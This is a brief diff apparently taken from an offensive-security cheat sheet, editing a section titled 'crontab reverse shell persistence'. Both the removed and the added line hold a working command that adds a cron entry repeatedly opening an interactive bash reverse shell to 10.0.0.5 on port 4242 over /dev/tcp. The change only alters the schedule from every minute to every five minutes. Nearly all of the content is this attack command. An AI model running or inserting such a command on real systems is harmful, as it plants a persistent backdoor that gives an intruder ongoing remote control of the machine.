@@ -27,7 +27,7 @@ EOF
 
 ### CRONTAB REVERSE SHELL PERSISTENCE ###
 # Add to crontab
-(crontab -l ; echo "* * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
+(crontab -l ; echo "*/5 * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
 
 #Manually
 #====suid binary=====
